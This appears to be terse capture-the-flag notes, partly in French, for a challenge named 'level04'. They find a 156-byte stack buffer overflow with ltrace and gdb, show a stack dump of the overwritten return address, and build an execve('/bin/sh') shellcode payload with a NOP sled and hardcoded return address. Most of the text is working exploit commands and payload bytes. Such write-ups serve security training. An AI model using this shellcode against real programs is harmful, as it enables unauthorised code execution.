# level04

python -c 'print "A"*157' | ltrace -f ./level04 segv

155 does not segv

156 doubles

0x42424242

With gdb
set follow-fork-mode child

Et avec en entrée `python -c "print 'A'*(156) + 'B'*4"`

Après le gets on a la stack
```
x/100xw $esp
0xffffd650:     0xffffd670      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000b80      0x00000000      0xf7fdc714      0x00000000
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd700:     0x41414141      0x41414141      0x41414141      0x42424242

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Notre payload ?
```
# 0xffffd670

\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

python -c "print '\x90'*(156 - 24) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x70\xd6\xff\xff'"

python -c "print '\x90'*(156 - 24) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x70\xd6\xff\xff'" | ltrace -f ./level04

(python -c "print '\x90'*(32) + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*(156-32-24) + '\x70\xd6\xff\xff'";) | ltrace -f ./level04

```
